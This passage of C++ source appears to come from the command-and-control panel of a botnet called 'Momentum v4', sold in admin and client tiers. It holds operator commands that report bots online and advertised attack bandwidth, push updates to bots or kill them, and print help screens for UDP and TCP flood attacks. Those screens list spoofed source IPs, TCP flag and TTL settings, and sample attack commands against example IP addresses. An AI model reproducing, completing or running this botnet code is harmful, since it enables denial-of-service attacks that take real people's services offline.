    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);

            mystats_stream << "\r\n\e[36;1mUsername: \e[37m" << login.username;
            mystats_stream << "\r\n\e[36;1mRank: \e[37mClients"; 
            mystats_stream << "\r\n\e[36;1mDevices online: \e[37m" << count;
            mystats_stream << "\r\n\e[36;1mDevices allowed: \e[37m " << maxclikos; 
            mystats_stream << "\r\n\e[36;1mConcurrent allowed: \e[37m" << concurrent_user; 
            mystats_stream << "\r\n\e[36;1mCooldown:\e[37m " << cooldown; 
            mystats_stream << "\r\n\e[36;1mMax boot time:\e[37m " << time_boot; 
            mystats_stream << "\r\n\e[36;1mEstimated Power:\e[32m25/45Gbps |\e[32m 2-6M PPS\e[36;1m Guaranteed";
            mystats_stream << "\r\n\r\n"; 
            send(fd, mystats_stream.str().c_str(), mystats_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

if(data == "quit")
{
    send(fd, "\r\n\e[91mAdios!\e[0m\r\n", strlen("\r\n\e[91mAdios!\e[0m\r\n"), MSG_NOSIGNAL);
    close(fd);
}

        if((data == "my statistics") && login.admin == 1)
        {

            std::stringstream mystats_stream;
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);

            mystats_stream << "\r\n\e[36;1mUsername: \e[37m" << login.username;
            mystats_stream << "\r\n\e[36;1mRank: \e[37mAdmin";
            mystats_stream << "\r\n\e[36;1mDevices online: \e[37m" << count;
            mystats_stream << "\r\n\e[36;1mDevices allowed: \e[37m unlimited"; 
            mystats_stream << "\r\n\e[36;1mConcurrent allowed: \e[37m" << concurrent_user; 
            mystats_stream << "\r\n\e[36;1mCooldown:\e[37m " << cooldown;
            mystats_stream << "\r\n\e[36;1mMax boot time:\e[37m " << time_boot;
            mystats_stream << "\r\n\e[36;1mEstimated Power: \e[32m400/600Gbps |\e[32m 50-90M PPS \e[36;1mGuaranteed | Unlimited Power";
            mystats_stream << "\r\n\r\n"; 
            send(fd, mystats_stream.str().c_str(), mystats_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }
if(data == "motd"){
    send(fd, "\e[32m", strlen("\e[32m"), MSG_NOSIGNAL);
    send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
    send(fd, "\r\n", 2, MSG_NOSIGNAL);
    continue;
}
        if(data == "update" && login.admin == 1 && count > 0)
        {                        
                        send(fd, "\033[37;1mBots updated successfuly\r\n", strlen("\033[37;1mBots updated successfuly\r\n"), MSG_NOSIGNAL);
                        update_bots(&process);
                        continue;
        }

        if(data == "update" && login.admin == 1 && count == 0)
        {
                        send(fd, "\033[37;1mImpossible to update.\r\n", strlen("\033[37;1mImpossible to update.\r\n"), MSG_NOSIGNAL);
                        continue;
        }

        if(data == "botkill" && login.admin == 1 && count > 0)
        {                        
                        send(fd, "\033[37;1mKilling all current running processes\033[38;5;220m!\r\n", strlen("\033[37;1mKilling all current running processes\033[38;5;220m!\r\n"), MSG_NOSIGNAL);
                        kill_self(&process);
                        continue;
        }


        if(data == "botkill" && login.admin == 1 && count == 0)
        {
                        send(fd, "\033[37;1mImpossible to kill.\r\n", strlen("\033[37;1mImpossible to kill.\r\n"), MSG_NOSIGNAL);
                        continue;
        }


        if(data == "botkill" && login.admin == 0)
        {
                        continue;
        }

        if(data == "update" && login.admin == 0)
        {
                        continue;
        }

        if(data == "bots")
        {
            std::stringstream count_stream;

            count_stream << "\e[33;1m* Bots Loaded\e[36;1m: " << count;
            count_stream << "\r\n\e[33;1m* Your maximum Allowed Bots\e[36;1m: " << maxclikos;

            count_stream << "\r\n";

            send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if(data == "cls") 
        {
            send(fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if((data == "clear") && login.admin == 1) 
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
    send(fd, "                                  \e[37mRank: \e[36;1mAdmin\r\n\r\n\e[32;1m", strlen("                                  \e[37mRank: \e[36;1mAdmin\r\n\r\n\e[32;1m"), MSG_NOSIGNAL);

    continue;
        }


        if((data == "clear") && login.admin == 0) 
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
    send(fd, "                                  \e[37mRank: \e[36;1mClient\r\n\r\n", strlen("                                  \e[37mRank: \e[36;1mClient\r\n\r\n"), MSG_NOSIGNAL);
    continue;
        }

        if(data == "!udp help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mUDP\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mUDP\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!udp 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n", strlen("\e[37m!udp 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!udpplain help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mUDPPLAIN\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mUDPPLAIN\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!udpplain 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n", strlen("\e[37m!udpplain 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!udpbypass help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mUDPBYPASS\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mUDPBYPASS\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!udpbypass 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n", strlen("\e[37m!udpbypass 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!tcpack help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mTCPACK\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mTCPACK\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!tcpack 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpack 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }
        
        if(data == "!tcpovh help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mTCPOVH\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mTCPOVH\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!tcpovh 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpovh 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }
        if(data == "!protocol help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mPROTOCOL\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mPROTOCOL\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!protocol 77.77.77.78 \e[36;1mport\e[37m=80\r\n", strlen("\e[37m!protocol 77.77.77.78 \e[36;1mport\e[37m=80\r\n"), MSG_NOSIGNAL);
            continue;
        }
        if(data == "!ethernet help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
